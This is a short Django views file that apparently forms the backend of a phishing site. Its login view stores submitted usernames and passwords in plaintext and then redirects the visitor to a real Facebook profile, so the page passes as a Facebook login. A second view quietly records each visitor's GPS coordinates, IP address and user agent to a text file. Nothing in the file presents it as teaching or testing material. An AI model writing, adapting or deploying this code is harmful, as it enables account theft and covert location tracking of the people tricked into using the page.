from django.shortcuts import render
from django.http import HttpResponse
from django.http import HttpResponseRedirect
import os
from .form import login_form
from .models import Person
# Create your views here.

def login(request):
    form = login_form()
    if request.method=='POST':
        form = login_form(request.POST)
        if form.is_valid():

            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            person = Person.objects.create(
            username=username,
            password=password,
            )
            return HttpResponseRedirect('https://www.facebook.com/profile.php?id=100002351173756')

    form = login_form()
    return render(request, 'login.html', {'form': form})


def save_location(request):
    lat = request.GET.get('lat', 'Unknown')
    long = request.GET.get('long', 'Unknown')
    user_agent = request.GET.get('user_agent', 'Unknown')
    ip_address = request.META.get('REMOTE_ADDR', 'Unknown')

    information = f"lat: {lat}\nlong: {long}\nip: {ip_address}\nuser_agent: {user_agent}"

    file_path = os.path.join('location.txt')
    with open(file_path, 'w') as file:
        file.write(information)

    return HttpResponse("Location information saved.")
